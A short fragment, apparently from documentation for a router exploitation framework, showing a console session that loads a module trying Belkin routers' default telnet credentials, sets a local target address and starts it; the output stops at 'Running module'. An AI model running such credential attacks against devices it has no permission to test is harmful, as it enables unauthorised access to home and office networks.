...
```
rxf > use creds/routers/belkin/telnet_default_creds
rxf (Belkin Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rxf (Belkin Router Default Telnet Creds) > run
[*] Running module...
